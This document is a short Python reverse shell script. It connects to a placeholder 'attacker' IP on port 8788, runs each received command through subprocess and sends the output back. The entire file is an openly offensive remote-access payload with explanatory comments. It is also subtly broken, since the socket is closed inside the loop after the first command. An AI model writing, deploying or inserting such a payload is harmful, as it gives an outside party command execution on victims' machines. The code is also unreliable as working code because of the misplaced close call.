import socket
import subprocess

if __name__ == "__main__":
    attacker_ip = "x.x.x.x" #### Enter Attacker IP at the place of "x.x.x.x" ####
    attacker_port = 8788 

    attacker_address = (attacker_ip, attacker_port) 
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # Created a socket using the IPv4 address and the TCP protocol

    client_socket.connect(attacker_address) # Connect client socket to the attacker machine

    print(f"Client is Connected to : {attacker_ip}:{attacker_port}")

    while True:
        command = client_socket.recv(1024).decode() # Receives a command from the attacker and decodes it from bytes to a string.

        if command.lower() == "exit": # If the command is exit then the loop gets terminated
            break

        output = subprocess.getoutput(command) # Execute the received command and capture the output
        client_socket.send(output.encode()) # Send the output of the command back to the attacker after encoding it to bytes

        client_socket.close()  # Close the connection to the attacker's machine